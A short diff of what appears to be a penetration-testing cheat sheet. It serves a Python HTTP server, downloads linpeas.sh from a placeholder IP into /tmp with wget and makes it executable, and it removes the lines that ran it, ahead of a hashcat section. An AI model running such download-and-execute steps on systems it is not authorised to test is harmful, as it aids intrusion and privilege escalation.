@@ -263,8 +263,6 @@ sudo python3 -m http.server 8080
 cd /tmp
 wget x.x.x.x:8080/linpeas.sh
 chmod +x linpeas.sh
-./linpeas.sh -a > ./output.txt
-less -r ./output.txt
 ```
 
 ## Crack hash with hashcat
